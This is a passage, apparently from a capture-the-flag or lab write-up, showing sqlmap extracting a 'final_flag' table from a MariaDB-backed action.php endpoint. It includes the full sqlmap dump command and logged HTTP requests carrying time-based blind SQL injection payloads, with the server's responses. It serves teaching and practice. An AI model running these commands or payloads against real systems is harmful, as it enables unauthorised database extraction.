do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)

```

Now that we confirmed the injection and the right switches, fetch the content of the final_flag table. 

```bash
$ sqlmap -r req-action.txt  --batch --tamper=between --dbms=mysql --technique=ET -D production -T final_flag -C id,content --dump --hex -t action-php-traffic.txt --fresh-queries
```

Requests:

```bash
HTTP request [#386]:
POST /action.php HTTP/1.1
Host: 94.237.53.219:50664
Content-Type: application/json
Content-length: 194
Connection: close

{"id": "1 AND (SELECT 5502 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT HEX(IFNULL(CAST(id AS NCHAR),0x20)) FROM production.final_flag ORDER BY id LIMIT 0,1),2,1))! BETWEEN 49 AND 49,0,2)))))fOPn)"}

HTTP response [#386] (200 OK):
Content-Length: 277
URI: http://94.237.53.219:50664/action.php

<b>SQL error:</b> SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '! BETWEEN 49 AND 49,0,2)))))fOPn), 852, 1, 392, 0)' at line 1<br>
############################################################################
HTTP request [#389]:
POST /action.php HTTP/1.1
Host: 94.237.53.219:50664
Content-Type: application/json
Content-length: 196
Connection: close

{"id": "1 AND (SELECT 5502 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT HEX(IFNULL(CAST(id AS NCHAR),0x20)) FROM production.final_flag ORDER BY id LIMIT 0,1),3,1)) NOT BETWEEN 0 AND 48,0,2)))))fOPn)"}

HTTP response [#389] (200 OK):
Content-Length: 0
URI: http://94.237.53.219:50664/action.php

############################################################################

HTTP request [#390]:
POST /action.php HTTP/1.1
Host: 94.237.53.219:50664
Content-Type: application/json
Content-length: 195

{"id": "1 AND (SELECT 5502 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT HEX(IFNULL(CAST(id AS NCHAR),0x20)) FROM production.final_flag ORDER BY id LIMIT 0,1),3,1)) NOT BETWEEN 0 AND 1,0,2)))))fOPn)"}

HTTP response [#390] (200 OK):
Content-Length: 0
URI: http://94.237.53.219:50664/action.php
```